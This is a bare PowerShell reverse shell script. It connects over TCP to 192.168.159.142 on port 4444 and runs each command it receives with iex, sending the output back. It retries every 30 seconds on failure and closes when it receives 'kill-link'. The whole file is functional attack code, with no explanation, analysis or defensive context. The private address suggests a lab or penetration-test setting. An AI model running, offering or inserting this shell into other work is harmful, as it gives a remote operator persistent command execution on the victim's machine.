 while (1 -eq 1)
{
    $ErrorActionPreference = 'Continue';
    try
    {
        #attempt inital connection
        $client = New-Object System.Net.Sockets.TCPClient("192.168.159.142",4444);
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..255|%{0};
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Client Connected..."+"`n`n" + "PS " + (pwd).Path + "> ");
        $stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush();
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $recdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            if($recdata.StartsWith("kill-link")){ cls; $client.Close(); exit;}
            try
            {
                #attempt to execute the received command
                $sendback = (iex $recdata 2>&1 | Out-String );
                $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
            }
            catch
            {
                $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
                $sendback2  =  "ERROR: " + $error[0].ToString() + "`n`n" + "PS " + (pwd).Path + "> ";
                cls;
            }
            $returnbytes = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($returnbytes,0,$returnbytes.Length);$stream.Flush();          
        }
    }
    catch 
    {
        #an initial connection error - close and wait 30 secs then retry
        if($client.Connected)
        {
            $client.Close();
        }
        cls;
        Start-Sleep -s 30;
    }     
}

